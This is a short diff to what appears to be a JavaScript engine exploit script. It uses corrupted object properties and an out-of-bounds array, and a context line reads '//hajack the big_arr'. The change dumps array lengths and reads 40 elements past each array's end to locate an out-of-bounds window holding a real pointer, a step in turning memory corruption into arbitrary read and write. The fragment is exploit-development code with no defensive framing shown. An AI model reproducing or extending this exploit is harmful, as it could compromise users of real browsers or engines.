@@ -206,9 +206,14 @@ createCorruptedPair(array, obj).then(function (pair) {
     print('dump ' + label + ' ' + parts.join(' '));
   }
   print('[+]dump-begin');
-  dumpArr('oob', oob_arr, 24);
-  dumpArr('corrupt2', object_2.corrupted_prop, 24);
-  print('biglen=' + big_arr.length + ' ooblen=' + oob_arr.length);
+  print('lens corrupt1=' + object_1.corrupted_prop.length +
+        ' corrupt2=' + object_2.corrupted_prop.length +
+        ' oob=' + oob_arr.length + ' big=' + big_arr.length);
+  // read well past each length: a real pointer where a hole should be is the
+  // out-of-bounds window we are looking for.
+  dumpArr('corrupt2', object_2.corrupted_prop, 40);
+  dumpArr('oob', oob_arr, 40);
+  dumpArr('big', big_arr, 8);
   print('[+]dump-end');
 
   //hajack the big_arr
